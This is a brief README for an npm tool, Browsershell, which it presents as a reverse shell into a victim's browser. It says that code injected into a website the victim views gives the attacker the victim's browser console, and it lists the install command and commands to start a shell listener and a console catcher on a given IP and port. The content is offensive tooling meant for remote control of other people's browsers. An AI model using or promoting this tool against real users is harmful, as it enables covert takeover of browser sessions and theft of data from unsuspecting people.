# Browsershell

This is a revserse shell to a browser session. The goal is that if you inject the given code into the website displayed by the victim, you will have access to his browser console, just like if you were opening the developer tools console.

```
npm i -g @sebastiandittrich/browsershell
```

## Example

Start a shell:

```
browsershell shell 192.168.0.10 3001
```

Listen for console output:

```
browsershell console-catcher 192.168.0.10 3002
```
